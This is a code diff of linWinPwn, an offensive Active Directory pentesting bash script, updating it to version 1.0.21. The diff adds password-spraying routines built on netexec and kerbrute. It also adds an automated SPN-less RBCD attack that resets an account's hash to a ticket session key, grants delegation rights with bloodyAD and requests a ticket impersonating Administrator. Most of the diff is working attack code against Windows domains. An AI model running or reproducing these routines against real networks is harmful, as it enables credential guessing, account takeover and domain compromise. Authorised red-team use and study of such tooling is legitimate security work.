@@ -74,10 +74,12 @@ impacket_wmiexec=$(which wmiexec.py)
 if [ ! -f "${impacket_wmiexec}" ]; then impacket_wmiexec=$(which impacket-wmiexec); fi
 impacket_psexec=$(which psexec.py)
 if [ ! -f "${impacket_psexec}" ]; then impacket_psexec=$(which impacket-psexec); fi
-impacket_smbpasswd=$(which smbpasswd.py)
-if [ ! -f "${impacket_smbpasswd}" ]; then impacket_smbpasswd=$(which impacket-smbpasswd); fi
+impacket_changepasswd=$(which changepasswd.py)
+if [ ! -f "${impacket_changepasswd}" ]; then impacket_changepasswd=$(which impacket-changepasswd); fi
 impacket_mssqlclient=$(which mssqlclient.py)
 if [ ! -f "${impacket_mssqlclient}" ]; then impacket_mssqlclient=$(which impacket-mssqlclient); fi
+impacket_describeticket=$(which describeTicket.py)
+if [ ! -f "${impacket_describeticket}" ]; then impacket_describeticket=$(which impacket-describeTicket); fi
 enum4linux_py=$(which enum4linux-ng)
 if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
 bloodhound=$(which bloodhound-python)
@@ -136,7 +138,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.20 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.21 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -641,16 +643,24 @@ authenticate() {
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}AES Kerberos key of ${user}${NC}"
     fi
 
+    if [ "${forcekerb_bool}" == true ]; then
+        argument_ne="${argument_ne} -k"
+        target=${dc_FQDN}
+        target_dc=${dc_hostname_list}
+        target_sql=${sql_hostname_list}
+        target_servers=${servers_hostname_list}
+    fi
+
     #Perform authentication using provided credentials
     if [ "${nullsess_bool}" == false ]; then
         auth_check=$(run_command "${netexec} smb ${target} ${argument_ne}" 2>&1 | grep "\[-\]\|Traceback" -A 10 2>&1)
         if [ -n "$auth_check" ]; then
             echo "$auth_check"
             if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]] || [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
-                if [ ! -f "${impacket_smbpasswd}" ]; then
-                    echo -e "${RED}[-] smbpasswd.py not found! Please verify the installation of impacket${NC}"
+                if [ ! -f "${impacket_changepasswd}" ]; then
+                    echo -e "${RED}[-] changepasswd.py not found! Please verify the installation of impacket${NC}"
                 elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-                    echo -e "${PURPLE}[-] smbpasswd does not support Kerberos authentication${NC}"
+                    echo -e "${PURPLE}[-] changepasswd does not support Kerberos authentication${NC}"
                 else
                     pass_passchange=""
                     if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]]; then
@@ -661,7 +671,7 @@ authenticate() {
                             read -rp ">> " pass_passchange </dev/tty
                         done
                         echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
-                        run_command "${impacket_smbpasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange}" | tee -a "${output_dir}/Modification/impacket_smbpasswd_${dc_domain}.txt"
+                        run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange}" | tee -a "${output_dir}/Modification/impacket_changepasswd_${dc_domain}.txt"
                     elif [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
                         echo -e "${BLUE}[*] Changing password of pre created computer account. Please specify new password:${NC}"
                         read -rp ">> " pass_passchange </dev/tty
@@ -684,7 +694,7 @@ authenticate() {
                             read -rp ">> " authpass_passchange </dev/tty
                         done
                         echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
-                        run_command "${impacket_smbpasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange} -altuser ${authuser_passchange} -altpass ${authpass_passchange}" | tee -a "${output_dir}/Modification/impacket_smbpasswd_${dc_domain}.txt"
+                        run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange} -altuser ${authuser_passchange} -altpass ${authpass_passchange}" | tee -a "${output_dir}/Modification/impacket_changepasswd_${dc_domain}.txt"
                     fi
                     password="${pass_passchange}"
                     auth_check=""
@@ -696,10 +706,6 @@ authenticate() {
             echo -e "${RED}[-] Error authenticating to domain! Please check your credentials and try again... ${NC}"
             exit 1
         fi
-    fi
-
-    if [ "${forcekerb_bool}" == true ]; then
-        argument_ne="${argument_ne} -k"
     fi
 
     if [ "${verbose_bool}" == true ]; then
@@ -1920,9 +1926,61 @@ userpass_kerbrute_check() {
     echo -e ""
 }
 
+ne_passpray() {
+    parse_users
+    if [ ! -s "${users_list}" ]; then
+        echo -e "${PURPLE}[-] No users found! Please re-run users enumeration and try again..${NC}"
+    else
+        echo -e "${BLUE}[*] Password spray using netexec (Noisy!)${NC}"
+        read -rp ">> " passpray_password </dev/tty
+        while [ "${passpray_password}" == "" ]; do
+            echo -e "${RED}Invalid password.${NC} Please specify password:"
+            read -rp ">> " passpray_password </dev/tty
+        done
+        echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
+        run_command "${netexec} ${ne_verbose} ldap ${target_dc} -u ${users_list} -p ${passpray_password} --no-bruteforce --continue-on-success --log ${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt" 2>&1
+        grep "\[+\]" "${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt"
+        if [ -s "${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt" ]; then
+            echo -e "${GREEN}[+] Printing accounts with password ${passpray_password}...${NC}"
+            /bin/cat "${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt" 2>/dev/null
+        else
+            echo -e "${PURPLE}[-] No accounts with password ${passpray_password} found${NC}"
+        fi
+    fi
+    echo -e ""
+}
+
+kerbrute_passpray() {
+    if [ ! -f "${kerbrute}" ]; then
+        echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
+    else
+        parse_users
+        echo -e "${BLUE}[*] Password spray using kerbrute (Noisy!)${NC}"
+        if [ -s "${users_list}" ]; then
+            echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
+            read -rp ">> " passpray_password </dev/tty
+            while [ "${passpray_password}" == "" ]; do
+                echo -e "${RED}Invalid password.${NC} Please specify password:"
+                read -rp ">> " passpray_password </dev/tty
+            done
+            run_command "${kerbrute} passwordspray ${users_list} ${passpray_password} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" >"${output_dir}/BruteForce/kerbrute_passpray_output_${dc_domain}.txt"
+            grep "VALID" "${output_dir}/BruteForce/kerbrute_passpray_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt"
+            if [ -s "${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt" ]; then
+                echo -e "${GREEN}[+] Printing accounts with password ${passpray_password}...${NC}"
+                /bin/cat "${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt" 2>/dev/null
+            else
+                echo -e "${PURPLE}[-] No accounts with password ${passpray_password} found${NC}"
+            fi
+        else
+            echo -e "${PURPLE}[-] No known users found. Run user enumeraton and try again.${NC}"
+        fi
+    fi
+    echo -e ""
+}
+
 ne_pre2k() {
-    echo -e "${BLUE}[*] SCCM Enumeration using netexec${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} -M pre2k --log ${output_dir}/BruteForce/ne_pre2k_output_${dc_domain}.txt" 2>&1
+    echo -e "${BLUE}[*] Pre2k Enumeration using netexec${NC}"
+    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} -M pre2k --log ${output_dir}/BruteForce/ne_pre2k_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -2797,10 +2855,74 @@ rbcd_attack() {
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${service_rbcd}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt"
             if grep -q "can now impersonate users" "${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt"; then
                 echo -e "${GREEN}[+] RBCD Attack successful! Run command below to generate ticket${NC}"
-                echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}:PASSWORD'"
+                echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}:<PASSWORD>'"
                 echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
                 echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}'"
             fi
+        fi
+    fi
+    echo -e ""
+}
+
+rbcd_spnless_attack() {
+    if [ ! -f "${bloodyad}" ]; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p "${output_dir}/Modification/bloodyAD"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Performing RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}"
+            target_rbcd=""
+            read -rp ">> " target_rbcd </dev/tty
+            while [ "${target_rbcd}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -rp ">> " target_rbcd </dev/tty
+            done
+            echo -e "${BLUE}[*] Please specify SPN-less account under your control:${NC}"
+            spnless_rbcd=""
+            read -rp ">> " spnless_rbcd </dev/tty
+            while [ "${spnless_rbcd}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify account under your control:"
+                read -rp ">> " spnless_rbcd </dev/tty
+            done
+            echo -e "${CYAN}[*] Performing RBCD attack against ${target_rbcd} using SPN-less account ${spnless_rbcd}${NC}"
+            if [ ! -f "${impacket_getTGT}" ]; then
+                echo -e "${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}"
+            else
+                if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+                    current_dir=$(pwd)
+                    cd "${output_dir}/Credentials" || exit
+                    echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
+                    spnless_hash=$(iconv -f ASCII -t UTF-16LE <(printf "%s" "$password") | $(which openssl) dgst -md4 | cut -d " " -f 2)
+                    run_command "${impacket_getTGT} ${domain}/${user} -hashes :${spnless_hash} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee "${output_dir}/Credentials/getTGT_output_${dc_domain}"
+                    cd "${current_dir}" || exit
+                    if [ -f "${output_dir}/Credentials/${user}.ccache" ]; then
+                        krb_ticket="${output_dir}/Credentials/${user}.ccache"
+                        echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb_ticket"
+                        ticketsesskey=$(${impacket_describeticket} "${output_dir}/Credentials/${user}.ccache" | grep 'Ticket Session Key' | cut -d " " -f 17)
+                        run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip} -newhashes :${ticketsesskey}" | tee -a "${output_dir}/Modification/impacket_spnless_changepasswd_${dc_domain}.txt"
+                        password=""
+                        pass_bool=false
+                        hash="${ticketsesskey}"
+                        hash_bool=true
+                        authenticate
+                        run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${spnless_rbcd}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_rbcdspnless_${dc_domain}.txt"
+                        if grep -q "can now impersonate users" "${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt"; then
+                            echo -e "${GREEN}[+] RBCD Attack successful! Attempting to generate ticket to impersonate Administrator${NC}"
+                            run_command "KRB5CCNAME=${output_dir}/Credentials/${user}.ccache ${impacket_getST} -u2u -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${spnless_rbcd}' -k -no-pass"
+                            echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
+                            echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${spnless_rbcd}'"
+                        fi
+                    else
+                        echo -e "${RED}[-] Failed to generate TGT${NC}"
+                    fi
+                else
+                    echo -e "${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}"
+                fi
+            fi
+
         fi
     fi
     echo -e ""
@@ -3888,6 +4010,8 @@ bruteforce_menu() {
     echo -e "5) Identify Pre-Created Computer Accounts using netexec (Noisy!)"
     echo -e "6) Pre2k computers authentication check (Noisy!)"
     echo -e "7) User Enumeration using ldapnomnom (Null session)"
+    echo -e "8) Password spraying using kerbrute (Noisy!)"
+    echo -e "9) Password spraying using netexec - ldap (Noisy!)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -3931,6 +4055,16 @@ bruteforce_menu() {
 
     7)
         ldapnomnom_enum
+        bruteforce_menu
+        ;;
+
+    8)
+        kerbrute_passpray
+        bruteforce_menu
+        ;;
+
+    9)
+        ne_passpray
         bruteforce_menu
         ;;
 
@@ -4800,12 +4934,13 @@ modif_menu() {
     echo -e "5) Change Owner of target (Requires: WriteOwner permission)"
     echo -e "6) Add GenericAll rights on target (Requires: Owner permission)"
     echo -e "7) Targeted Kerberoast Attack (Noisy!)"
-    echo -e "8) Perform RBCD attack (Requires: GenericWrite or GenericAll on computer)"
-    echo -e "9) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
-    echo -e "10) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
-    echo -e "11) Add Unconstrained Delegation rights (Requires: SeEnableDelegationPrivilege rights)"
-    echo -e "12) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights (Requires: Owner of computer)"
-    echo -e "13) Add userPrincipalName to perform Kerberos impersonation (Requires: GenericWrite or GenericAll on user)"
+    echo -e "8) Perform RBCD attack (Requires: GenericWrite or GenericAll or AllowedToAct on computer)"
+    echo -e "9) Perform RBCD attack on SPN-less user (Requires: GenericWrite or GenericAll or AllowedToAct on computer & MAQ=0)"
+    echo -e "10) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
+    echo -e "11) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
+    echo -e "12) Add Unconstrained Delegation rights (Requires: SeEnableDelegationPrivilege rights)"
+    echo -e "13) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights (Requires: Owner of computer)"
+    echo -e "14) Add userPrincipalName to perform Kerberos impersonation (Requires: GenericWrite or GenericAll on user)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4853,26 +4988,31 @@ modif_menu() {
         ;;
 
     9)
-        shadowcreds_attack
+        rbcd_spnless_attack
         modif_menu
         ;;
 
     10)
-        pygpo_abuse
+        shadowcreds_attack
         modif_menu
         ;;
 
     11)
-        add_unconstrained
+        pygpo_abuse
         modif_menu
         ;;
 
     12)
-        add_spn
+        add_unconstrained
         modif_menu
         ;;
 
     13)
+        add_spn
+        modif_menu
+        ;;
+
+    14)
         add_upn
         main_menu
         ;;
@@ -5167,7 +5307,8 @@ config_menu() {
         if [ ! -f "${impacket_ticketer}" ]; then echo -e "${RED}[-] impacket's ticketer is not installed${NC}"; else echo -e "${GREEN}[+] impacket's ticketer is installed${NC}"; fi
         if [ ! -f "${impacket_getST}" ]; then echo -e "${RED}[-] impacket's getST is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getST is installed${NC}"; fi
         if [ ! -f "${impacket_raiseChild}" ]; then echo -e "${RED}[-] impacket's raiseChild is not installed${NC}"; else echo -e "${GREEN}[+] impacket's raiseChild is installed${NC}"; fi
-        if [ ! -f "${impacket_smbpasswd}" ]; then echo -e "${RED}[-] impacket's smbpasswd is not installed${NC}"; else echo -e "${GREEN}[+] impacket's smbpasswd is installed${NC}"; fi
+        if [ ! -f "${impacket_changepasswd}" ]; then echo -e "${RED}[-] impacket's changepasswd is not installed${NC}"; else echo -e "${GREEN}[+] impacket's changepasswd is installed${NC}"; fi
+        if [ ! -f "${impacket_describeticket}" ]; then echo -e "${RED}[-] impacket's describeTicket is not installed${NC}"; else echo -e "${GREEN}[+] impacket's describeticket is installed${NC}"; fi
         if [ ! -f "${bloodhound}" ]; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
         if [ ! -f "${ldapdomaindump}" ]; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
         if [ ! -f "${netexec}" ]; then echo -e "${RED}[-] netexec is not installed${NC}"; else echo -e "${GREEN}[+] netexec is installed${NC}"; fi
